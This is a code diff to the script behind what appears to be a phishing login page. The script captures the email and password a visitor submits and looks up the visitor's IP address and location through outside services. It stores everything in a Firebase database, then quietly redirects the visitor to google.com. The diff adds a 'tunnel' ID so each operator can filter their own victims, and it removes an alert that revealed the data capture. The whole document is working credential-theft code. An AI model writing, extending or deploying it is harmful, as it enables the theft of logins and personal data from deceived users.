@@ -77,13 +77,21 @@ const db = getFirestore(app);
 // Redirect URL after successful login (change this to your desired destination)
 const REDIRECT_URL = "https://www.google.com";
 
+// Get tunnel ID from URL parameter
+function getTunnelIdFromUrl() {
+  const params = new URLSearchParams(window.location.search);
+  return params.get('tunnel') || 'default';
+}
+
 document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
   
   const email = document.getElementById('email').value;
   const password = document.getElementById('password').value;
+  const tunnelId = getTunnelIdFromUrl();
   
   console.log('Form submitted with email:', email);
+  console.log('Tunnel ID:', tunnelId);
   
   // Get IP address and country using multiple fallback methods
   let ipAddress = 'Unknown';
@@ -91,13 +99,12 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   
   // Method 1: Try ip-api.com (most reliable free option, no rate limit for non-HTTPS)
   try {
-    // Using http because ip-api.com is free only for non-HTTPS requests
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 5000);
     
     const ipResponse = await fetch('http://ip-api.com/json/?fields=query,countryCode,country,regionName,city', {
       signal: controller.signal,
-      mode: 'no-cors' // Some browsers block this, but worth trying
+      mode: 'no-cors'
     });
     clearTimeout(timeoutId);
     
@@ -169,7 +176,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
       if (response.ok) {
         const data = await response.json();
         ipAddress = data.ip || 'Unknown';
-        country = 'Unknown'; // No country data from this service
+        country = 'Unknown';
         console.log('IP Data (method 4 - ipify):', ipAddress, country);
       }
     } catch (err) {
@@ -181,8 +188,8 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   
   // Get current date and time
   const now = new Date();
-  const dateStr = now.toISOString().split('T')[0]; // YYYY-MM-DD
-  const timeStr = now.toISOString().split('T')[1].slice(0, 8); // HH:MM:SS
+  const dateStr = now.toISOString().split('T')[0];
+  const timeStr = now.toISOString().split('T')[1].slice(0, 8);
   
   console.log('Date:', dateStr, 'Time:', timeStr);
   
@@ -194,7 +201,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   
   console.log('Username:', username);
   
-  // Store in Firebase
+  // Store in Firebase with tunnel ID for user-specific filtering
   try {
     console.log('Attempting to write to Firebase Firestore...');
     console.log('Project ID:', firebaseConfig.projectId);
@@ -207,6 +214,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
       country: country,
       date: now.toISOString(),
       time: timeStr,
+      tunnelId: tunnelId,  // Store tunnel ID for filtering
       createdAt: serverTimestamp()
     });
     
@@ -220,9 +228,6 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   } catch (error) {
     console.error('❌ Error sending to Firebase:', error.code, error.message);
     console.error('Full error:', error);
-    
-    // Show alert to user about the error (for debugging)
-    alert('Login processing... (Data capture: ' + error.code + ')');
     
     // Still redirect even if Firebase fails
     setTimeout(() => {
